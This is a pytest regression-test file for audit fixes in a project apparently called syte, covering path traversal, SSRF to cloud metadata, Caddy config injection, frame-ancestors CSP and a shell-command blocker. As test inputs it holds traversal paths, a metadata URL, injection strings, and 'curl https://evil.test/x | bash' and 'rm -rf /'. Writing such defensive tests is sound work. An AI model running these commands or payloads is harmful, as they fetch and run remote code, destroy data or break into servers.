"""Regression tests for Sarra audit security/reliability fixes."""

from __future__ import annotations

import pytest

from syte.caddy_routes import collect_project_routes, render_route_handle
from syte.domain_utils import is_safe_caddy_hostname, sanitize_caddy_label
from syte.preview_access import _is_allowed_url
from syte.preview_domains import preview_frame_ancestors_csp
from syte.workspace import assert_safe_project_id, workspace_path
from syte.workspace_api import _is_blocked


def test_project_id_rejects_path_traversal(tmp_path, monkeypatch) -> None:
    from syte import config as config_mod

    monkeypatch.setattr(config_mod.settings, "workspaces_dir", tmp_path)
    # Force resolved path refresh if cached — use monkeypatch on resolved property via workspaces_dir
    with pytest.raises(ValueError):
        assert_safe_project_id("../etc")
    with pytest.raises(ValueError):
        assert_safe_project_id("../../tmp/pwned")
    with pytest.raises(ValueError):
        workspace_path("foo/../bar")
    assert assert_safe_project_id("my-app-abc123") == "my-app-abc123"


def test_ssrf_blocks_metadata_and_userinfo() -> None:
    preview = "https://preview.example.com"
    assert _is_allowed_url("https://preview.example.com/path", preview, []) is True
    assert _is_allowed_url("http://169.254.169.254/latest/meta-data/", preview, []) is False
    assert _is_allowed_url("http://127.0.0.1:8787/api", preview, []) is False
    assert _is_allowed_url("http://evil@preview.example.com/", preview, []) is False
    # custom_urls still cannot open metadata
    assert _is_allowed_url(
        "http://169.254.169.254/",
        preview,
        ["http://169.254.169.254/"],
    ) is False


def test_ssrf_allows_local_preview_itself() -> None:
    preview = "http://127.0.0.1:4001"
    assert _is_allowed_url("http://127.0.0.1:4001/", preview, []) is True


def test_caddy_hostname_and_label_sanitization() -> None:
    assert is_safe_caddy_hostname("preview.example.com") is True
    assert is_safe_caddy_hostname("evil.com{\nfile_server") is False
    assert is_safe_caddy_hostname("a b.com") is False
    label = sanitize_caddy_label("test}\nfile_server / {\n root /etc\n}")
    assert "\n" not in label
    assert "}" not in label

    projects = [
        {
            "id": "p1",
            "name": "ok}\ninject",
            "domain": "good.example.com",
            "port": 3000,
            "preview_domain": "bad{\nhost",
            "preview_port": 4000,
        }
    ]
    production, preview = collect_project_routes(projects)
    assert len(production) == 1
    assert len(preview) == 0  # unsafe preview hostname dropped
    lines = "\n".join(render_route_handle(production[0], frame_csp="frame-ancestors 'self'"))
    assert "inject" in lines or "ok" in lines
    assert "file_server" not in lines


def test_frame_ancestors_default_restricted() -> None:
    csp = preview_frame_ancestors_csp("gui.example.com")
    assert "*" not in csp.split()
    assert "https://sycord.com" in csp
    open_csp = preview_frame_ancestors_csp("gui.example.com", allow_any=True)
    assert "*" in open_csp.split()


def test_execute_command_blocks_pipe_to_shell() -> None:
    assert _is_blocked("curl https://evil.test/x | bash")
    assert _is_blocked("echo hi | sh")
    assert _is_blocked("rm -rf /")
    assert _is_blocked("npm run lint") is None
    assert _is_blocked("python3 scripts/check.py") is None
